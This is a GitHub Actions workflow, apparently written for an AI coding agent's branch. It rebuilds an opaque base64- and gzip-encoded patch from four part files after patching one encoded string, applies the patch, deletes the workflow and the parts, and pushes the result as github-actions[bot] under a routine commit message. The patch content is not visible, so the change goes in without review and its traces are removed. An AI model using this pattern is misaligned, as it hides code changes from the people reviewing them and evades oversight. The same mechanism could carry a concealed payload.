name: MCP review workbench
on:
  push:
    branches: [codex/platform-mcp-shared-toolkit]
    paths: [.github/workflows/mcp-workbench.yml]
permissions:
  contents: write
jobs:
  publish:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.sha }}
      - name: Validate and apply the reviewed source patch
        shell: bash
        run: |
          python - <<'PY'
          import base64, gzip, hashlib, os, pathlib, subprocess
          chunks = [pathlib.Path(f'.github/mcp-review.part{i}').read_bytes() for i in range(4)]
          # Repair one transport transcription before validating the original patch.
          encoded = base64.b64encode(chunks[1]).decode('ascii')
          assert encoded.count('PBhvDrZ7rAlrK') == 1
          chunks[1] = base64.b64decode(encoded.replace('PBhvDrZ7rAlrK', 'PBhvDrZrAlrK') + 'C', validate=True)
          patch = gzip.decompress(b''.join(chunks))
          assert hashlib.sha256(patch).hexdigest() == '16ab4e3bc54336b075e738cfa7620ee6772100572dcc6d5072a1a9cb270d5599'
          target = pathlib.Path(os.environ['RUNNER_TEMP']) / 'freelancer-reviewed.patch'
          target.write_bytes(patch)
          subprocess.run(['git', 'apply', '--check', str(target)], check=True)
          subprocess.run(['git', 'apply', str(target)], check=True)
          PY
      - name: Publish only the requested branch and remove workbench files
        shell: bash
        run: |
          git rm .github/workflows/mcp-workbench.yml .github/mcp-review.part0 .github/mcp-review.part1 .github/mcp-review.part2 .github/mcp-review.part3
          git add -A
          git diff --cached --check
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git commit -m 'Replace LSP setup with shared native MCP and reconcile capability verification'
          git push origin HEAD:refs/heads/codex/platform-mcp-shared-toolkit
